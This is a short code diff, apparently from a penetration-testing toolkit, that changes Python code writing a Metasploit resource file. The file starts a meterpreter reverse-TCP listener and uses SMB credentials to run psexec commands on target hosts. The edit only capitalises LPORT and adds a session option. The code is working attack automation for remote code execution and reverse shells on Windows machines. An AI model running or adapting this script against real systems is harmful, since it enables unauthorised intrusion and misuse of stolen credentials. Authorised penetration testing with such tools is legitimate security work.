@@ -74,7 +74,7 @@ try:
 
     # write out our answer file for the powershell injection attack
     filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
-    filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j\nuse auxiliary/admin/smb/psexec_command\nset RHOSTS %s\nset SMBUser %s\nset SMBPass %s\nset SMBDomain %s\nset THREADS %s\nset COMMAND %s\nset EnableStageEncoding %s\nset ExitOnSession false\nexploit\n" % (port,rhosts,username,password,domain,threads,command, stage_encoding))
+    filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LPORT %s\nset LHOST 0.0.0.0\nset ExitOnSession false\nexploit -j\nuse auxiliary/admin/smb/psexec_command\nset RHOSTS %s\nset SMBUser %s\nset SMBPass %s\nset SMBDomain %s\nset THREADS %s\nset COMMAND %s\nset EnableStageEncoding %s\nset ExitOnSession false\nexploit\n" % (port,rhosts,username,password,domain,threads,command, stage_encoding))
     filewrite.close()
     msf_path = meta_path()
     # launch metasploit below
